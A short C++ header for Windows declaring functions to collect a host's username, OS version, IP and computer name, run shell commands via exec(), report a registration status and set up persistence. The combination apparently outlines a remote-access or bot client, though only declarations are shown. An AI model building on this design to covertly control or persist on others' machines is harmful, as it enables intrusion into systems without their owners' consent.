#pragma once

#include <windows.h>
#include <string>


#define INFO_BUFFER_SIZE 32767

enum class STATUS_CODE {
	NOT_REGISTERED,
	DONE,
	NOT_DONE
};

struct BasicUserInformation {
	LPSTR UserName;
	RTL_OSVERSIONINFOW* osvi;
	LPSTR Ip;
	LPSTR ComputerName;
};

BOOL GetBasicUserInformation(struct BasicUserInformation& basicUserInformation);
std::string GetUserIP();

std::string exec(const std::string& command);

bool persistence();